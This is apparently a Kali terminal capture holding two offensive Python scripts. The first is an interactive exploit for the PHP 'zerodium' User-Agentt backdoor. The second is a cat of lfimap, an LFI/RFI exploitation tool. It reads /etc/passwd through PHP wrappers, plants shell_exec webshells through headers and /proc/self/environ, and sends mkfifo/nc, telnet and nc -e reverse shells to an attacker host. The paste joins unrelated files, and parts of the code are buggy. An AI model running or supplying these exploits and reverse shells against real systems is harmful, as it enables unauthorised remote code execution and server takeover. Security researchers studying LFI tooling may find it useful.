#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
┌──(kali㉿kali)-[~]
└─$ rm exploit.py                                                                     
rm: remove write-protected regular file 'exploit.py'? ls
┌──(kali㉿kali)-[~]
└─$ ls                                                                                
Desktop    Downloads   Music  Pictures  Public     Videos
Documents  exploit.py  peda   Private   Templates
┌──(kali㉿kali)-[~]
└─$ rm exploit.py 
rm: remove write-protected regular file 'exploit.py'? y
┌──(kali㉿kali)-[~]
└─$ ls                                                                                
Desktop    Downloads  peda      Private  Templates
Documents  Music      Pictures  Public   Videos
┌──(kali㉿kali)-[~]
└─$ cd Private/                                                                       
┌──(kali㉿kali)-[~/Private]
└─$ ls                                                                                
ctf  lfimap  mach1ne
┌──(kali㉿kali)-[~/Private]
└─$ cd lfimap/                                                                        
┌──(kali㉿kali)-[~/Private/lfimap]
└─$ ls                                                                                
lfimap.py  LICENSE  README.md  requirements.txt  wordlist.txt
┌──(kali㉿kali)-[~/Private/lfimap]
└─$ cat lfimap.py                                                                     
#!/usr/bin/env python3

import os
import sys
import re
import socket
import subprocess
import random
import argparse
import requests
import requests.exceptions
import threading
import time

from http.server import HTTPServer, SimpleHTTPRequestHandler
from argparse import RawTextHelpFormatter


class MyHandler(SimpleHTTPRequestHandler):
    
    def do_GET(self):
        if(self.path =='/'):
            self.path = 'index.html'
            self.wfile.write(bytes("<p>961bb08a95dbc34397248d92352da799</p>", "utf-8"))

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
        
        else: return SimpleHTTPRequestHandler.do_GET(self)



exploits = []
proxies = {}

def prepareHeaders():
    user_agents = [
                ":Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
                ":Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
                ":Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
                ":Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
                ":Mozilla/3.01 (Macintosh; PPC)",
                ":Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
                ":Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
                ":Opera/8.00 (Windows NT 5.1; U; en)",
                ":Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                  ]                                                                                                                                                                             
    headers = {}                                                                                                                                                                                
    if(args.agent):
        headers['User-Agent'] = ":" + agent                                                                                                                                                     
    else:                                                                                                                                                                    
        headers['User-Agent'] = random.choice(user_agents)                                                                                                                                      
    if(args.referer):
        headers['Referer'] = ':' + referer
    
    headers['Accept-Language'] = ':en-US;'
    headers['Accept-Encoding'] = ':gzip, deflate'
    headers['Accept'] = ':text/html,application/xhtml+xml,application/xml;'
    headers['Connection'] = ':Close'
    return headers


def addHeader(newKey, newVal):
    headers[newKey] = newVal


def getExploit(req, request_type, exploit_type, getVal, postVal, headers, attackType, os):
    global exploits
    e = {}
    e['REQUEST_TYPE'] = request_type
    e['EXPLOIT_TYPE'] = exploit_type
    e['GETVAL'] = getVal
    e['POSTVAL'] = postVal
    e['HEADERS'] = req.headers
    e['ATTACK_METHOD'] = attackType
    e['OS'] = os
    exploits.append(e)
    return e

def test_wordlist(url):
    if(args.verbose):
        print("Testing path truncation using '" + wordlist + "' wordlist ...")

    f = open(wordlist, "r")
    
    for line in f:
        line = line[:-1]
        if("DESTROY" in url):
            u = url.replace("DESTROY", line)

        try:
            res = requests.get(u, headers = headers, proxies = proxies)
        except:
            print("Proxy problem... Exiting.")
            sys.exit(-1)

        if(checkPayload(res)):
            if('/etc/passwd' in u):
                tempUrl = u.replace('/etc/passwd', 'TMP')
                os = 'LINUX'
            else:
                tempUrl = u.replace('Windows/System32/drivers/etc/hosts', 'TMP')
                os = 'WINDOWS'

            getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'TRUNC', os)
            print("[+] LFI -> " + u)
            f.close()

            if(args.revshell):
                exploit(exploits, 'TRUNC')
            
            return  #To prevent further unnecessary traffic


def test_php_filter(url):
    if(args.verbose):
        print("Testing PHP filter wrapper ...")

    testL = []
    testL.append("php://filter/resource=/etc/passwd")
    testL.append("php://filter/convert.base64-encode/resource=/etc/passwd")
    testL.append("php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd")
    testL.append("php://filter/read=string.rot13/resource=/etc/passwd")
    
    testW = []
    testW.append("php://filter/resource=C:/Windows/System32/drivers/etc/hosts")
    testW.append("php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts")
    testW.append("php://filter/convert.iconv.utf-8.utf-16/resource=C:/Windows/System32/drivers/etc/hosts")
    testW.append("php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts")
    
    #Linux
    for i in range(len(testL)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testL[i])
        
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
        except:
            print("Proxy problem... Exiting.")
            sys.exit(-1)

        if(checkPayload(res)):
            tempUrl = u.replace('/etc/passwd', 'TMP')
            getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'LINUX')
            print("[+] LFI -> " + u)
    
    #Windows
    for i in range(len(testW)):
        u = url.replace("DESTROY", testW[i])
        
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
        except:
            print("Proxy problem.. Exiting.")
            sys.exit(-1)

        if(checkPayload(res)):
            tempUrl = u.replace("C:/Windows/System32/drivers/etc/hosts", 'TMP')
            getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'WINDOWS')
            print("[+] LFI -> " + u)


def test_php_data(url):
    if(args.verbose):
        print("Testing PHP data wrapper ...")

    testL = []
    testL.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd")
    testW = []
    testW.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig")
    
    #Linux
    for i in range(len(testL)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testL[i])
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
        except:
            print("Proxy problem... Exiting.")
            sys.exit(-1)

        if(checkPayload(res)):
            tempUrl = u.replace('cat%20/etc/passwd', 'TMP')
            getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'LINUX')
            print("[+] RCE -> " + u)
    
    #Windows
    for i in range(len(testW)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testW[i])
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
        except:
            print("Proxy problem... Exiting.")
            sys.exit(-1)

        if(checkPayload(res)):
            tempUrl = u.replace('ipconfig', 'TMP')
            getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'WINDOWS')
            print("[+] RCE -> " + u)
    
    if(args.revshell):
        exploit(exploits, 'DATA')


def test_php_input(url):
    if(args.verbose):
        print("Testing PHP input wrapper ...")

    testL = []
    testL.append("php://input&cmd=cat%20/etc/passwd")
    
    testW = []
    testW.append("php://input&cmd=ipconfig")
    
    posts = []
    posts.append("<?php echo shell_exec($_GET['cmd']) ?>")
    posts.append("<? system('cat /etc/passwd');echo exec($_GET['cmd']);?>")
    
    #Linux
    for i in range(len(testL)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testL[i])
    
        for j in range(len(posts)):
            try:
                res = requests.post(u, headers = headers, data=posts[j], proxies = proxies)
            except:
                print("Proxy problem... Exiting.")
                sys.exit(-1)
            
            if(checkPayload(res)):
                print("[+] RCE -> " + u + " -> HTTP POST: " + posts[j])
                tempUrl = u.replace('cat%20/etc/passwd', 'TMP')
                getExploit(res, 'POST', 'RCE', tempUrl, posts[j], headers, 'INPUT', 'LINUX')
    
    #Windows
    for k in range(len(testW)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testW[k])
        
        for l in range(len(posts)):
            try:
                res = requests.post(u, headers = headers, data = posts[l], proxies = proxies)
            except:
                print("Proxy problem... Exiting.")
                sys.exit(-1)

            if(checkPayload(res)):
                tempUrl = u.replace('ipconfig', 'TMP')
                getExploit(res, 'POST', 'RCE', tempUrl, posts[l], headers, 'INPUT', 'WINDOWS')
                print("[+] RCE -> " + u + " -> HTTP POST: " + posts[l])
    
    if(args.revshell):
        exploit(exploits, 'INPUT')


def test_php_expect(url):
    if(args.verbose):
            print("Testing PHP expect wrapper ...")

    testL = []
    testL.append("expect://cat%20%2Fetc%2Fpasswd")
    
    testW = []
    testW.append("expect://ipconfig")

    #Linux
    for i in range(len(testL)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testL[i])
        
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
        except:
            print("Proxy problem... Exiting.")
            sys.exit(-1)

        if(checkPayload(res)):
            tempUrl = u.replace('cat%20%2Fetc%2Fpasswd', 'TMP')
            getExploit(res, 'GET', 'RCE', tempUrl, testL[i], headers, 'EXPECT', 'LINUX')
            print("[+] RCE -> " + u)

    #Windows
    for j in range(len(testW)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testW[j])
        
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
        except:
            print("Proxy problem... Exiting.")
            sys.exit(-1)
        
        if(checkPayload(res)):
            tempUrl = u.replace('ipconfig', 'TMP')
            getExploit(res, 'GET', 'RCE', tempUrl, testW[j], headers, 'EXPECT', 'WINDOWS')
            print("[+] RCE -> " + u)
    
    if(args.revshell):
        exploit(exploits, 'EXPECT')

def test_rfi(url):
    if(args.verbose):
        print("Testing for RFI ...")

    
    #Local RFI test
    if(args.lhost):
        server = HTTPServer((args.lhost, 75), MyHandler)
        threading.Thread(target = server.serve_forever).start()

        if('DESTROY' in url):
            pyld = "http%3a//"+args.lhost+":75/"
            u = url.replace('DESTROY', pyld)
            try:
                res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
                if(checkPayload(res)):
                    tempUrl = u.replace(pyld, 'TMP')
                    getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
                    print("[+] RFI -> " + u)
                    return
            except:
                pass
    
    #Internet RFI test
    if("DESTROY" in url):
        pyld = "https%3a//www.google.com/"
        u = url.replace("DESTROY", pyld)
    try:
        res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
        if(checkPayload(res)):
            tempUrl = u.replace(pyld, 'TMP')
            getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
            print("[+] RFI -> " + u)
    except:
        pass

    if(args.revshell):
        exploit(exploits, 'RFI')

#Checks if sent payload is executed, key word check in response
def checkPayload(webResponse):
    KEY_WORDS = ["root:x:0:0", "www-data:",
                "cm9vdDp4OjA6MD", "Ond3dy1kYXRhO", "ebbg:k:0:0",
                "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0",
                "; for 16-bit app support", "sample HOSTS file used by Microsoft",
                "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
                ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
                "c2FtcGxlIEhPU1RT", "=1943785348b45",
                "window.google=", "961bb08a95dbc34397248d92352da799"]

    for i in range(len(KEY_WORDS)):
        if KEY_WORDS[i] in webResponse.text:
            return True
    return False


#Todo Future enumeration:
#awk -F: '/\/home/ && ($3 >= 1000) {printf "%s:%s\n",$1,$3}' /etc/passwd
#query = "awk -F: '/\/home/ && ($3 >= 1000) || ($3 == 0) {printf "%s\n",$1}' /etc/passwd"
#echo -n "OS: "; uname -o; echo -n "Kernel: ";uname -srm; echo "\nENV VARIABLES:";printenv

def printInfo(ip, port, shellType, attackMethod):
    print("[i] Sending reverse shell to {0}:{1} using {2} via {3}...".format(ip, port, shellType, attackMethod))

#Todo exploitation using input, data,expect for windows OS
#Todo bash, python, php,... rev shells
def exploit(exploits, method):
    for i in range(len(exploits)):
        exploit = exploits[i]
        
        ip = args.lhost
        port = args.lport
        
        if(exploit['ATTACK_METHOD'] == method and method == 'INPUT'):
            #LINUX
            if(exploit['OS'] == 'LINUX'):
                url = exploit['GETVAL']
                
                #Netcat
                u = url.replace('TMP', 'which%20nc')
                res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
                if('/bin' in res.text and '/nc' in res.text):
                    ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"
                    u = url.replace('TMP', ncPayload)
                    printInfo(ip, port, 'nc', 'input wrapper')
                    res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                    return

                #Telnet
                u = url.replace('TMP', 'which%20telnet')
                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                if('/bin' in res.text and '/telnet' in res.text):
                    telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port)
                    u = url.replace('TMP', telnetPayload)
                    printInfo(ip, port, 'telnet', 'input wrapper')
                    res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                    return
            

            #WINDOWS
            elif(exploit['OS'] == 'WINDOWS'):
                url = exploit['GETVAL']
                u = url.replace('TMP', 'dir%20C:\Windows\System32')
                res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
                if('nc.exe' in res.text):
                    u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
                    printInfo(ip, port, 'nc', 'input wrapper')
                    res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                    return

        elif(exploit['ATTACK_METHOD'] == method and method == 'DATA'):
            #Linux
            if(exploit['OS'] == 'LINUX'):
                url = exploit['GETVAL']
                
                #Netcat
                u = url.replace('TMP', 'which%20nc')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/nc' in res.text):
                    printInfo(ip, port, 'nc', 'data wrapper')
                    u = url.replace('TMP', "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
                    res = requests.get(u, headers = headers, proxies = proxies)
                    return
                
                #Telnet
                u = url.replace('TMP', 'which%20telnet')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/telnet' in res.text):
                    u = url.replace('TMP', "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port))
                    printInfo(ip, port, 'telnet', 'data wrapper')
                    requests.get(u, headers = headers, proxies = proxies)
                    return

            #Windows
            else:
                url = exploit['GETVAL']
                u = url.replace('TMP', "dir%20C:\Windows\System32")
                res = requests.get(u, headers = headers, proxies = proxies)
                if('nc.exe' in res.text):
                    u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
                    printInfo(ip, port, 'nc', 'input wrapper')
                    res = requests.get(u, headers = headers, proxies = proxies)
                    return



        elif(exploit['ATTACK_METHOD'] == method and method == 'EXPECT'):
            #Linux
            if(exploit['OS' == 'LINUX']):
                url = exploit['GETVAL']
                
                #Netcat
                u = url.replace('TMP', 'which%20nc')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/nc' in res.text):
                    u = url.replace('TMP', "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port))
                    printInfo(ip, port, 'nc', 'expect wrapper')
                    res = requests.get(u, headers = headers, proxies = proxies)
                    return
                
                #Telnet
                u = url.replace('TMP', 'which%20telnet')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/telnet' in res.text):
                    u = url.replace('TMP', "")
                    printInfo(ip, port, 'telnet', 'expect wrapper')
                    requests.get(u, headers = headers, proxies = proxies)
                    return

            #Windows
            else:
                url = exploit['GETVAL']
                u = url.replace('TMP', "dir%20C:\Windows\System32")
                res = request.get(u, headers = headers, proxies = proxies)
                if('nc.exe' in res.text):
                    u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
                    printInfo(ip, port, 'nc', 'expect wrapper')
                    res = request.get(u, headers = headers, proxies = proxies)
                    return



        elif(exploit['ATTACK_METHOD'] == method and method == 'TRUNC'):
            #LINUX
            if(exploit['OS'] == 'LINUX'):
                url = exploit['GETVAL']
                
                #/proc/self/environ LFI to rev shell
                tempHeaders = headers
                tempHeaders['User-Agent'] = "<?php echo shell_exec($_GET['cmd']); ?>"
                tempHeaders['Referer'] = "<?php echo shell_exec($_GET['cmd']); ?>"
                u = url.replace('TMP', '/proc/self/environ')
               
                #Code injection
                res = requests.get(u, headers =tempHeaders, proxies = proxies)
                if(args.verbose):
                    print("[i] Trying to send reverse shell using /proc/self/environ LFI ...")
                
                #Exploit
                u = url.replace('TMP', "/proc/self/environ&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
                res = requests.get(u, headers = tempHeaders, proxies = proxies)
                
                #/proc/self/fd/ LFI to rev shell
                if(args.verbose):
                   print("[i] Bruteforcing /proc/self/fd descriptors ...")
               
                for i in range(15):
                    u = url.replace('TMP', "/proc/self/fd/{0}".format(i) + "?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
                    if(args.verbose): print(u)
                    requests.get(u, headers = tempHeaders, proxies = proxies)
        
        elif(exploit['ATTACK_METHOD'] == method and method == 'RFI'):
            #url = exploit['GETVAL']
            #u = url.replace('TMP', 'http://' + ip + ":" + port + "/")
            #res = requests.get(u, headers = headers, proxies = proxies)
            pass
                
#mknod backpipe p && telnet 192.168.80.129 80 0<backpipe | /bin/bash 1>backpipe

def main():
    global exploits
    global proxies
    
    if(args.proxyAddr):
        proxies['http'] = 'http://'+args.proxyAddr
        proxies['https'] = 'https://'+args.proxyAddr

    #Perform all tests
    if(args.test_all):
        test_php_filter(url)
        test_php_input(url)
        test_php_data(url)
        test_php_expect(url)
        test_rfi(url)
        test_wordlist(url)
        
        print("Done.")
        sys.exit(0)

    default = True
    if(args.wordlist):
        default = False
        test_wordlist(url)
    if(args.php_filter):
        default = False
        test_php_filter(url)
    if(args.php_input):
        default = False
        test_php_input(url)
    if(args.php_data):
        default = False
        test_php_data(url)
    if(args.php_expect):
        default = False
        test_php_expect(url)
    if(args.rfi):
        default = False
        test_rfi(url)

    #Default behaviour
    if(default):
        test_php_filter(url)
        test_php_input(url)
        test_php_data(url)
        test_php_expect(url)
        test_rfi(url)

    print("Done.")
    exit(0)

if(__name__ == "__main__"):
    
    print("")
    parser = argparse.ArgumentParser(description="lfimap, LFI discovery and exploitation tool", formatter_class=RawTextHelpFormatter, add_help=False)

    optionsGroup = parser.add_argument_group('GENERAL')
    optionsGroup.add_argument('url', type=str, metavar="URL", help="""\t\t Specify url, Ex: "http://example.org/vuln.php?param=DESTROY" """)
    optionsGroup.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45"')
    optionsGroup.add_argument('-p', type=str, metavar = "<proxy>", dest="proxyAddr", help="\t\t Specify Proxy IP address. Ex: '10.10.10.10:8080'")
    optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest="agent", help="\t\t Specify HTTP user agent")
    optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help="\t\t Specify HTTP referer")
    
    attackGroup = parser.add_argument_group('ATTACK TECHNIQUE')
    attackGroup.add_argument('--php-filter', action="store_true", dest = 'php_filter', help="\t\t Attack using php filter wrapper")
    attackGroup.add_argument('--php-input', action="store_true", dest = 'php_input', help="\t\t Attack using php input wrapper")
    attackGroup.add_argument('--php-data', action="store_true", dest = 'php_data', help="\t\t Attack using php data wrapper")
    attackGroup.add_argument('--php-expect', action="store_true", dest = 'php_expect', help="\t\t Attack using php expect wrapper")
    attackGroup.add_argument('--rfi', action = "store_true", dest='rfi', help="\t\t Attack using remote file inclusion")
    attackGroup.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Specify wordlist for truncation attack")
    attackGroup.add_argument('-aa', '--attack-all', action="store_true", dest = 'test_all', help="\t\t Use all available methods to attack")

    #postExpGroup = parser.add_argument_group('ENUMERATE')
    
    payloadGroup = parser.add_argument_group('PAYLOAD')
    payloadGroup.add_argument('-x', '--send-revshell',action="store_true", dest="revshell", help="\t\t Send reverse shell connection if possible (Setup reverse handler first.)")
    payloadGroup.add_argument('--lhost', type=str, metavar="<lhost>", dest="lhost", help="\t\t Specify localhost IP address for reverse connection")
    payloadGroup.add_argument('--lport', type=int, metavar="<lport>", dest="lport", help="\t\t Specify local PORT number for reverse connection")

    otherGroup = parser.add_argument_group('OTHER')
    otherGroup.add_argument('-v', '--verbose', action="store_true", dest="verbose", help="\t\t Print more detailed output when performing attacks\n")
    otherGroup.add_argument('-h', '--help', action="help", default=argparse.SUPPRESS, help="\t\t Print this help message")
    args = parser.parse_args()

    url = args.url
    wordlist = args.wordlist
    agent = args.agent
    referer = args.referer

    #Checks if provided URL is valid
    urlRegex = re.compile(
    r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
    r'localhost|' #localhost...
    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
    r'(?::\d+)?' # optional port
    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    
    if(re.match(urlRegex, url) is None):
        print("URL not valid, exiting...")
        sys.exit(-1)
    
    #Checks if provided wordlist exists
    if(wordlist is not None):
        if(not os.path.isfile(wordlist)):
            print("Specified wordlist doesn't exist. Exiting...")
            sys.exit(-1)
    else:
        wordlist = "wordlist.txt"
    
    #Checks if '--lhost' and '--lport' are provided with '-x'
    if(args.revshell):
        if(not args.lhost or not args.lport):
            print("Please, specify localhost IP and PORT number for reverse shell! Exiting...")
            sys.exit(-1)
        else:
            reg = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
            if(not re.match(reg, args.lhost)):
                print("LHOST IP address is not valid. Exiting...")
                sys.exit(-1)

            if(args.lport<1 or args.lport>65534):
                print("LPORT must be between 0 and 65535. Exiting ...")
                sys.exit(-1)

    #Checks if any parameter is selected for testing
    if("DESTROY" not in url):
        print("Please use DESTROY as a vulnerable parameter value that you want to exploit\n")
        sys.exit(-1)
    
    #Warning if cookie is not provided
    if(not args.cookie):
        print("WARNING: Cookie argument ('-c') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
        time.sleep(2)

    if(args.rfi and not args.lhost):
        print("WARNING: RFI test will try to include source from internet, not locally, because '--lhost' is not set.\n")
        time.sleep(2)

    
    #Everything is OK, preparing http request headers
    headers = prepareHeaders()
    if(args.cookie is not None):
        addHeader('Cookie', args.cookie)
    
    main()